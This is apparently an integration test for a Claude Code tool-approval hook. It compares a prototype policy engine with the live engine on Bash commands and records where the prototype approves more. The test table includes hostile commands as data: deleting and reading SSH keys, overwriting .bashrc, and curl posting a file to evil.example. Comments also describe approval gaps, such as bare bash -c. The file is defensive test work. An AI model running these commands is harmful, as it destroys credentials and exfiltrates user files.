//go:build integration

// This is the AGREEMENT HARNESS (spike slice 3b, harness 1): for a fixed
// table of Bash commands it evaluates BOTH the spike (Evaluate, over
// cmddesc.DefaultRegistry/DefaultPolicies/DefaultGraphPolicies) and the LIVE
// engine (setup.NewEngineForCWD, the same composition root the real
// PreToolUse hook uses) under the same fixture, and classifies every row.
//
// It carries `//go:build integration` — the repo's existing tagged-suite
// convention (README.md's "Two test suites") — because it is the one place
// in the effectpolicy package that must reach internal/hookio, internal/
// setup and internal/engine to drive the live decision path.
// TestNoDirectHookioImport (imports_guard_test.go) explicitly excludes any
// "*_integration_test.go" file from its scan for exactly this reason.
package effectpolicy

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"text/tabwriter"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmddesc"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/engine"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/evalcontract"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/setup"
)

// agreementCase is one row driven through BOTH engines. Unlike goldenCase it
// carries no expected Decision: the point of this harness is to observe what
// each engine actually says and classify the pair, not to assert a
// pre-decided verdict per row.
type agreementCase struct {
	name    string
	command string
	vetted  []string
}

// goldenAgreementCases is every case already in golden_test.go's table,
// carried over verbatim (command + vetted host list; the golden `want` is
// dropped — this harness classifies by comparing the two engines, not by
// checking either one against a fixed expectation).
var goldenAgreementCases = func() []agreementCase {
	out := make([]agreementCase, len(goldenCases))
	for i, gc := range goldenCases {
		out[i] = agreementCase{name: gc.name, command: gc.command, vetted: gc.vetted}
	}
	return out
}()

// extraAgreementCases adds coverage the golden table does not exercise,
// drawn from the LIVE engine's own test suites for the basenames this spike
// models (cat, head, sed, rm, cp, tee, bash, sh, xargs, curl) — see
// internal/rules/safecmds/*_test.go and internal/engine/*_test.go — adapted
// to run under fixture()'s files (README.md, script.sed, script.sh, list.txt,
// sub/) rather than copied verbatim, since the originals reference paths
// (/home/user/project/..., /etc/shadow) that either don't exist under this
// fixture or carry the same NixOS-portability hazard golden_test.go's own
// comment already flags for /etc/hosts (a real /etc/shadow read is
// host-dependent; /nix/store and ~/.ssh are the two paths already proven
// portable here, so every new case reuses those instead of /etc/*).
//
// Each is chosen to probe a specific gap or overlap between the schema-driven
// spike and the live rule chain:
//
//   - head_numeric_shorthand / head_numeric_shorthand_project: GNU `head -N`
//     (the legacy glued-digit form) is not a flag the registry's headSchema
//     models (only -n/--lines/-c/--bytes/-q/-v) — safecmds recognizes it and
//     approves; the spike's generic interpreter sees an unknown short flag and
//     abstains.
//   - bash_n_script / sh_n_script: `-n` (noexec) is deliberately left out of
//     bashSchema (see registry.go's own comment) so it abstains; safecmds
//     approves a syntax-check of a readable script.
//   - rm_rf_dollar_home_ssh / cp_exfil_dollar_home / tee_dollar_home: the
//     three non-cat entries from engine_integration_test.go's own
//     TestIntegration_HookBypassRegression bypass list, adapted to fixture
//     paths.
//   - cat_dollar_home_ssh_id_rsa: a dynamic ($HOME-expanded) secret path, from
//     safecmds_test.go's dynamic-secret-path table.
//   - sed_dynamic_file_e / sed_bare_var_script: sed's positional file operand
//     and its program operand, each made dynamic — two different code paths
//     in the sed schema's dynamic handling.
//   - xargs_sh_c_echo / xargs_curl_pipe / xargs_unknown_cmd_pipe: xargs child
//     reconstruction landing on a shell recursion, a registered
//     command-level interpreter, and an unregistered basename, respectively —
//     adapted from safecmds_test.go's xargs table.
//   - cp_multi_source_existing_dir: cp's documented "last positional is
//     always PathTruncate" simplification (registry.go's cpSchema comment)
//     exercised with a REAL multi-source-into-existing-directory copy, to
//     check the simplification doesn't cause a verdict divergence even though
//     it models the mechanics differently.
//   - cp_target_dir_readonly_flag: the -t/--target-directory path, distinct
//     from the golden table's plain-trailing-destination coverage.
//   - curl_head_method_vetted / curl_data_binary_at_readme: a second read-only
//     HTTP method and a second DataOrAtFile flag spelling, beyond the golden
//     table's -X/-d coverage.
//   - head_bytes_project / cat_show_all_flags / sed_line_length: registry
//     flags (head -c/--bytes, cat -A/--show-all, sed -l/--line-length) no
//     golden case exercises.
var extraAgreementCases = []agreementCase{
	{"head_numeric_shorthand_project", "head -20 README.md", nil},
	{"bash_n_script", "bash -n script.sh", nil},
	{"sh_n_script", "sh -n script.sh", nil},
	{"rm_rf_dollar_home_ssh", "rm -rf $HOME/.ssh", nil},
	{"cp_exfil_dollar_home", "cp README.md $HOME/exfil", nil},
	{"tee_dollar_home", "tee $HOME/.bashrc", nil},
	{"cat_dollar_home_ssh_id_rsa", "cat $HOME/.ssh/id_rsa", nil},
	{"sed_dynamic_file_e", "sed -e 's/a/b/' $F", nil},
	{"sed_bare_var_script", "sed $S README.md", nil},
	{"xargs_sh_c_echo", "cat list.txt | xargs sh -c echo", nil},
	{"xargs_curl_pipe", "cat list.txt | xargs curl http://example.com", nil},
	{"xargs_unknown_cmd_pipe", "cat list.txt | xargs unknown_cmd", nil},
	{"cp_multi_source_existing_dir", "cp README.md script.sh sub", nil},
	{"cp_target_dir_readonly_flag", "cp -t /nix/store README.md", nil},
	{"rm_plain_nix_store", "rm /nix/store/some-link", nil},
	{"curl_head_method_vetted", "curl -I https://example.com/x", []string{"example.com"}},
	{"curl_data_binary_at_readme", "curl --data-binary @README.md https://evil.example", nil},
	{"head_bytes_project", "head -c 10 README.md", nil},
	{"cat_show_all_flags", "cat -A README.md", nil},
	{"sed_line_length", "sed -l 80 -n '1p' README.md", nil},
}

// liveCurlConfig is written into the fixture HOME's rules.json so the live
// curl rule (internal/rules/curl, config-driven) is decisive over the SAME
// hosts the golden/extra tables mark vetted for the spike ("example.com" and
// its subdomains), rather than abstaining on every curl case for want of any
// consumer configuration at all. It is a FIXED, per-run consumer config —
// unlike the spike's Request.VettedHosts, which is per-case — so a case that
// leaves VettedHosts nil (curl_unvetted) still sees the live engine approve a
// read-only request to example.com. That is not a bug in either engine: it
// is a structural difference between a per-request concept (evalcontract
// port) and a global-config concept (rules.json), reported here as
// spike-stricter rather than agreement. See TestAgreement's doc comment.
const liveCurlConfig = `{"curl":{"allowedDomainSuffixes":["example.com",".example.com"]}}`

// buildLiveEngine installs liveCurlConfig into the fixture HOME's XDG config
// path and constructs the live engine setup.NewEngineForCWD builds for the
// real PreToolUse hook — the same composition root, over the same
// root/cwd/HOME the spike's Request uses.
func buildLiveEngine(t *testing.T, root, home string) *engine.Engine {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", "")
	cfgDir := filepath.Join(home, ".config", "claude-extended-tool-approver")
	if err := os.MkdirAll(cfgDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cfgDir, "rules.json"), []byte(liveCurlConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	return setup.NewEngineForCWD(root)
}

// evaluateLive builds the same minimal Bash HookInput the rest of this
// module's non-integration tests use to drive a real engine (see
// internal/engine/verdict_provenance_test.go's provenanceInput and
// internal/engine/enginetest_helpers_test.go's makeBashJSON) and runs it
// through EvaluateHook, the one dispatch point real hook decisions and
// offline replay both go through.
func evaluateLive(eng *engine.Engine, cwd, command string) hookio.RuleResult {
	body, _ := json.Marshal(hookio.BashToolInput{Command: command})
	return eng.EvaluateHook(&hookio.HookInput{
		ToolName:      "Bash",
		CWD:           cwd,
		ToolInput:     json.RawMessage(body),
		HookEventName: "PreToolUse",
	})
}

// liveLabel names a hookio.Decision for this harness's table. Deliberately
// NOT hookio.Decision.String(): that method's NoOpinion->"abstain" mapping is
// a SERIALIZATION convention (persisted rows, replay diffs — see verdict.go)
// that would collide, in this table, with the spike's OWN "abstain" string
// for evalcontract.Abstain — two different concepts (chain exhaustion vs.
// model insufficiency) printed identically. This harness needs the reader to
// tell them apart at a glance.
func liveLabel(d hookio.Decision) string {
	switch d {
	case hookio.Approve:
		return "approve"
	case hookio.NoOpinion:
		return "noopinion"
	case hookio.Ask:
		return "ask"
	case hookio.Reject:
		return "reject"
	default:
		return "invalid"
	}
}

// classify assigns one of six classes to a (live, spike) verdict pair. The
// live decision vocabulary is four-valued (Approve < NoOpinion < Ask <
// Reject); the spike's is three-valued (Approve, Reject, Abstain — Ask is in
// evalcontract's vocabulary but nothing in the spike ever emits it). Note
// that hookio.RuleResult already folds BOTH "no rule recognized this leaf"
// (chain exhaustion / not-applicable) and an explicit rule-level abstention
// into the single Decision value NoOpinion (hookio.MostRestrictive's fold;
// see setup.NewEngineForCWD/engine.EvaluateHook), so this function cannot
// and does not distinguish those two live causes by Decision alone — a row's
// spike_reason / live column (which also carries the deciding Module) is
// what a reader consults to tell them apart. The function below is a total,
// exhaustive case analysis over all 4x3 = 12 combinations, in this
// precedence order:
//
//  1. agree: live=Approve AND spike=Approve — both silently green-light it.
//  2. spike-stricter: live=Approve AND spike != Approve (spike Abstains or
//     Rejects something the live chain would silently approve). SAFE
//     direction: the spike is pickier than production. Reported, never
//     asserted against.
//  3. looser-than-reject: live in {Reject, Ask} AND spike=Approve — the
//     spike silently approves something the live chain reached a DECISIVE
//     non-approving verdict on (a hard Reject, or a question live wanted a
//     human to answer). This is the more severe of the two looser classes:
//     live did not merely decline to opine, it affirmatively said no or
//     asked. THE SAFETY PROPERTY: TestAgreement asserts this class is always
//     empty unless the row is registered in knownSpikeLooser.
//  4. looser-than-abstain: live=NoOpinion AND spike=Approve — the spike
//     silently approves something the live chain has NO opinion on (chain
//     exhaustion or an explicit rule abstention — see the note above; either
//     way NoOpinion re-engages Claude Code's own prompt exactly like Ask
//     does; see engine_integration_test.go's own bypass-suite comment,
//     "Abstain re-engages Claude's own prompt", and hookio's Decision doc,
//     "Approve is LEAST restrictive — a green light that suppresses Claude
//     Code's own permission prompt"). Also a HARD FAILURE unless registered
//     — the severity split from case 3 is for the OPERATOR'S triage
//     (a live Reject/Ask is a stronger prior that live's model is right than
//     live simply never having formed an opinion), not a relaxation: an
//     unregistered row in EITHER class 3 or class 4 fails TestAgreement.
//  5. agree: live=Reject AND spike=Reject — both decisively forbid it.
//  6. spike-stricter: spike=Reject AND live in {NoOpinion, Ask} (neither
//     Approve nor Reject) — the spike reaches a firm forbidden verdict where
//     the live chain only deferred or asked. Still SAFE (more restrictive),
//     folded into the same class as case 2 for the same reason: it demotes
//     nothing, it only says no where production said "I don't know" or "ask
//     a human".
//  7. spike-underinformed: live=Reject AND spike=Abstain — the live chain
//     found a concrete forbidden effect the spike's model has no basis to
//     flag (no policy fired Forbidden, so it merely Abstains). Distinct from
//     spike-stricter: the spike is NOT being extra cautious here, it simply
//     has a blind spot. Still SAFE (Abstain never approves), but it is a real
//     gap in what the spike currently understands and is reported as such.
//  8. both-undecided: everything left — live in {NoOpinion, Ask} AND
//     spike=Abstain. Neither engine reached a decisive Approve or Reject.
func classify(live hookio.Decision, spike evalcontract.Decision) string {
	switch {
	case live == hookio.Approve && spike == evalcontract.Approve:
		return "agree"
	case live == hookio.Approve:
		return "spike-stricter"
	case spike == evalcontract.Approve && (live == hookio.Reject || live == hookio.Ask):
		return "looser-than-reject"
	case spike == evalcontract.Approve:
		return "looser-than-abstain"
	case live == hookio.Reject && spike == evalcontract.Reject:
		return "agree"
	case spike == evalcontract.Reject:
		return "spike-stricter"
	case live == hookio.Reject:
		return "spike-underinformed"
	default:
		return "both-undecided"
	}
}

// spikeLooserEntry is one REGISTER row: the looser CLASS this harness
// observed for the case (see classify) and the CAUSE, root-caused down to
// the spike's design (never a harness-construction error). Recording the
// class alongside the cause lets TestAgreement notice when a registered
// row's real class DRIFTS — e.g. a later change to either engine turns a
// live NoOpinion into a live Reject for the same case — which would silently
// change which severity bucket the row belongs to while the register still
// spoke of the old one. A drifted entry is STALE and must be re-investigated
// and re-registered under its new class, not left as-is.
type spikeLooserEntry struct {
	Class string
	Cause string
}

// knownSpikeLooser is a REGISTER of looser-than-reject / looser-than-abstain
// rows this harness has already investigated down to a root cause in the
// SPIKE'S DESIGN. It is not a suppression: a listed row still classifies,
// prints, and golden-diffs into its class in the table exactly like any
// other — only the hard test FAILURE is deferred for these specific, named
// cases, and only when the row's OBSERVED class still matches what is
// registered here. Any looser row not in this map, or whose registered
// Class no longer matches the harness's own classify() output, fails
// TestAgreement immediately.
//
// bash_c_cat_readme / bash_c_bash_c_cat_readme share one root cause, found by
// this harness (spike slice 3b): evaluate.go folds Approve whenever every
// recursed Command node is Permitted (by design since slice 1's doc comment
// on Evaluate), and the shell-dialect interpreter (slice 2b) recurses into
// ANY `bash -c`/`sh -c` program at any depth. Production's safecmds rule, by
// contrast, only auto-clears a `sh|bash -c` script when it is reached
// THROUGH xargs (safecmds.go's dedicated "xargs sh -c" branch) or carries
// `-n` (syntax-check-only, hasBashSyntaxCheckFlag) — a BARE top-level
// `bash -c '<script>'` matches no rule in setup.RuleChain at all and the
// chain exhausts to NoOpinion (confirmed empirically: no rule's stderr trace
// line fires for that leaf). The spike is therefore MORE PERMISSIVE than
// today's production engine for this one shape, independent of how well it
// understands the RECURSED content — the load-bearing finding this whole
// harness exists to surface.
//
// The five `git` rows and the one redirect row were added by slice 3d, after
// 3a's git support and 3c's redirect-fact support were cherry-picked onto
// this branch alongside 3b's harnesses — see each entry's Cause for the
// per-row root cause (read from both engines' source, no verdict changed on
// either side to make these agree).
var knownSpikeLooser = map[string]spikeLooserEntry{
	"bash_c_cat_readme": {
		Class: "looser-than-abstain",
		Cause: "spike recurses into a bare top-level `bash -c` and approves once the " +
			"recursed leaf is permitted; production's safecmds only auto-clears sh|bash -c " +
			"reached through xargs or under -n, so a bare `bash -c 'cat README.md'` reaches " +
			"chain exhaustion (NoOpinion) in production today.",
	},
	"bash_c_bash_c_cat_readme": {
		Class: "looser-than-abstain",
		Cause: "same root cause as bash_c_cat_readme, one recursion level deeper " +
			"(bash -c wrapping another bash -c): the spike's recursion is depth-general " +
			"(up to maxChildDepth); production has no top-level bash -c rule at any depth.",
	},
	"git_push_force_dry_run": {
		Class: "looser-than-reject",
		Cause: "internal/rules/git/git.go's pushVerdict rejects on `--force`/`-f` (HasLongFlagPrefix/" +
			"HasShortFlag) UNCONDITIONALLY — it never looks for `-n`/`--dry-run` at all, so " +
			"`git push --force -n origin main` is refused exactly like a real force-push. The " +
			"spike's gitPushSchema instead models `-n`/`--dry-run` as a real TransformDryRun " +
			"(cmddesc/transform.go) that strips EVERY EffectRemote whose Operation is in " +
			"remoteMutationOps ({push, force-push, delete-ref}) — applied generically, in flag " +
			"order (interpreter.go's result()), over whatever the OTHER flags on the same leaf " +
			"already produced. `-f`/`--force` retargets the effect's Operation from \"push\" to " +
			"\"force-push\" (TransformForce) BEFORE the dry-run transform runs, but force-push is " +
			"still a member of remoteMutationOps, so the dry-run strips it anyway; the EffectRemote " +
			"never reaches DefaultPolicies' RemoteMutation policy (policy.go), which only judges " +
			"EffectRemote effects — with none left, nothing is Forbidden and the leaf Approves. " +
			"The live rule is the more precise one here: it correctly treats `--dry-run` as " +
			"irrelevant to whether the FORCE OPERATION ITSELF is prohibited (a dry-run still " +
			"reports what a force-push would do, and the operator ruling in pushVerdict's doc " +
			"comment is about the operation being typed at all, not about its network effect). " +
			"The spike's dry-run transform models real git semantics (a dry run genuinely mutates " +
			"nothing) but does not know this codebase's operator-specific ruling that even a " +
			"dry-run SPELLING of a forbidden push should not be auto-cleared.",
	},
	"git_push_dry_run_force": {
		Class: "looser-than-reject",
		Cause: "same root cause as git_push_force_dry_run, flags in the other order: " +
			"remoteMutationOps already includes both \"push\" and \"force-push\", so the dry-run " +
			"transform strips the EffectRemote whichever transform (TransformDryRun or " +
			"TransformForce) runs first — `-n --force` strips the plain \"push\" effect before " +
			"TransformForce's retarget finds anything left to retarget, a no-op. The result is " +
			"identical to git_push_force_dry_run: no EffectRemote survives to reach RemoteMutation, " +
			"so the spike Approves while pushVerdict's unconditional force check Rejects.",
	},
	"git_clean_n": {
		Class: "looser-than-abstain",
		Cause: "internal/rules/git/git.go's `clean` arm is a deliberate, operator-ruled (2026-07-30, " +
			"pg2-u0e0c) UNIFORM Abstain for every spelling of `git clean` — including `-n`/" +
			"`--dry-run` — with NO flag inspection at all (the doc comment there records the ruling " +
			"explicitly REJECTED a flag-aware design). So live abstains (NoOpinion) on a dry-run " +
			"clean exactly like every other spelling. The spike's gitCleanSchema instead models " +
			"`-n`/`--dry-run` as a real TransformDryRun: it strips every write-access EffectPath " +
			"(registry.go's gitCleanSchema comment), which removes the implicit `PathDelete \".\"` " +
			"this leaf would otherwise emit (no positional given), leaving no effect for any policy " +
			"to forbid — the spike Approves. This is not a bug in either engine's modeling of git " +
			"itself (a real `-n` clean truly deletes nothing); it is that production's ruling is " +
			"deliberately more conservative than git's own semantics for this whole subcommand, " +
			"and the spike's schema has no way to represent \"treat this subcommand as opaque\" " +
			"short of leaving it unregistered.",
	},
	"git_clean_nd": {
		Class: "looser-than-abstain",
		Cause: "same root cause as git_clean_n (the uniform operator-ruled Abstain covers `-nd` " +
			"exactly like `-n`); the spike's TransformDryRun strips the implicit delete the same way " +
			"regardless of the accompanying `-d`, since `-d` is modeled `inert` in gitCleanSchema.",
	},
	"git_clean_f": {
		Class: "looser-than-abstain",
		Cause: "live abstains uniformly on `git clean` per the same pg2-u0e0c ruling (no flag " +
			"inspection, `-f` included). The spike's gitCleanSchema treats `-f` as `inert` (no " +
			"transform) and emits the implicit `PathDelete \".\"` (no positional given), which " +
			"NoWriteToReadOnlyPath judges against the fixture project root — a read-write zone — " +
			"and Approves. This is a genuine, unresolved POLICY QUESTION for the operator, not a " +
			"model imprecision on either side: `git clean -f` really does irreversibly delete " +
			"untracked files under the CWD, and the spike's registry+policy pair auto-approves " +
			"that whenever the CWD is a read-write zone, while production's ruling treats the " +
			"whole subcommand as needing a human every time specifically because deletion of " +
			"untracked files (uncommitted work, un-ignored secrets) is irreversible and the " +
			"read-write-zone test alone does not capture that risk. Recorded here for the " +
			"operator to decide, not resolved by this harness.",
	},
	"git_clean_fd_pathspec": {
		Class: "looser-than-abstain",
		Cause: "same policy question as git_clean_f, with an explicit pathspec (`sub`) instead of " +
			"the implicit \".\": gitCleanSchema's `Positionals: PathDelete` emits an explicit " +
			"PathDelete for `sub`, which resolves under the same read-write project root and " +
			"Approves, while live's uniform ruling abstains regardless of pathspec.",
	},
	"cat_redirect_single_quoted_literal": {
		Class: "looser-than-abstain",
		Cause: "internal/engine/engine.go's isDynamicRedirectTarget is a RAW-TEXT heuristic " +
			"(`strings.ContainsAny(path, \"$`\")`) applied to the redirection target string as " +
			"WRITTEN, so `'$literal'` — a single-quoted, non-expanding literal filename whose bytes " +
			"merely contain a `$` — is misclassified dynamic; evaluateRedirections cannot resolve it " +
			"as a literal (cmdparse.ExpandInCommand only resolves an ambient variable BINDING, not " +
			"an unbound name) and falls through to a NoOpinion (\"redirection: dynamically-expanded " +
			"target $literal (deferred to claude-code)\"). The spike's redirectionEffect " +
			"(effectgraph/build.go) instead classifies by the PARSER'S OWN fact, " +
			"hookio.Redirection.LiveExpansion — set by cmdparse's shell AST walk " +
			"(wordHasLiveExpansion), which sees that the target word is single-quoted and contains " +
			"no live expansion — so Dynamic=false and the target is evaluated as the static path " +
			"`$literal` against the read-write project root: Approve. The spike is the more precise " +
			"engine here: LiveExpansion is exactly the AST-level check slice 3c added " +
			"(commit 37b3561d) to retire this same `$`/backtick substring heuristic from the " +
			"spike's OWN redirect handling; production's engine.go still carries the heuristic " +
			"slice 3c only removed from the spike side.",
	},
}

// TestAgreement drives every case in goldenAgreementCases and
// extraAgreementCases through both engines under the SAME fixture, checks
// the one safety property that decides whether this architecture could carry
// the load in production (no unregistered looser-than-reject or
// looser-than-abstain row — the spike must never silently approve something
// the live engine would not, whether live decisively said no/ask or merely
// had no opinion), and reports the full classified table via t.Log and a
// committed golden file (testdata/agreement.txt).
//
// Every OTHER class (agree, spike-stricter, spike-underinformed,
// both-undecided) is reported, never asserted against — see classify's doc
// comment for why each is safe to observe without failing the build.
func TestAgreement(t *testing.T) {
	root, home := fixture(t)
	reg := cmddesc.DefaultRegistry()
	live := buildLiveEngine(t, root, home)

	cases := make([]agreementCase, 0, len(goldenAgreementCases)+len(extraAgreementCases))
	cases = append(cases, goldenAgreementCases...)
	cases = append(cases, extraAgreementCases...)

	type row struct {
		name, command, liveCol, spikeCol, class, spikeReason string
	}
	rows := make([]row, 0, len(cases))
	counts := map[string]int{}
	var looserRows []row

	for _, tc := range cases {
		spikeResp := Evaluate(evalcontract.Request{
			Command: tc.command, CWD: root, ProjectRoot: root, VettedHosts: tc.vetted,
		}, reg, DefaultPolicies(), DefaultGraphPolicies())
		liveResult := evaluateLive(live, root, tc.command)

		liveCol := liveLabel(liveResult.Decision)
		if liveResult.Module != "" {
			liveCol += "/" + liveResult.Module
		}
		class := classify(liveResult.Decision, spikeResp.Decision)
		counts[class]++

		r := row{
			name:        tc.name,
			command:     tc.command,
			liveCol:     liveCol,
			spikeCol:    spikeResp.Decision.String(),
			class:       class,
			spikeReason: spikeResp.Reason,
		}
		rows = append(rows, r)
		if class == "looser-than-reject" || class == "looser-than-abstain" {
			if entry, known := knownSpikeLooser[tc.name]; known {
				if entry.Class != class {
					t.Errorf("STALE register entry: case %s: command %q: knownSpikeLooser records class %q but the harness now observes %q — re-investigate and re-register under the observed class",
						tc.name, tc.command, entry.Class, class)
					looserRows = append(looserRows, r)
				} else {
					t.Logf("KNOWN %s (tracked, not failed): case %s: command %q: %s", class, tc.name, tc.command, entry.Cause)
				}
			} else {
				looserRows = append(looserRows, r)
			}
		}
	}

	var buf bytes.Buffer
	tw := tabwriter.NewWriter(&buf, 2, 4, 2, ' ', 0)
	fmt.Fprintln(tw, "case\tcommand\tlive\tspike\tclass\tspike_reason")
	for _, r := range rows {
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%s\t%s\n", r.name, r.command, r.liveCol, r.spikeCol, r.class, r.spikeReason)
	}
	if err := tw.Flush(); err != nil {
		t.Fatal(err)
	}
	table := normalize(buf.String(), root, home)

	t.Log("\n" + table)
	compareGolden(t, filepath.Join("testdata", "agreement.txt"), table)

	t.Logf("agreement class counts: %v (total %d)", counts, len(rows))

	for _, r := range looserRows {
		t.Errorf("SAFETY VIOLATION (%s): case %s: command %q: live=%s spike=%s reason=%q — the spike silently approved something the live engine would not",
			r.class, r.name, r.command, r.liveCol, r.spikeCol, r.spikeReason)
	}
}
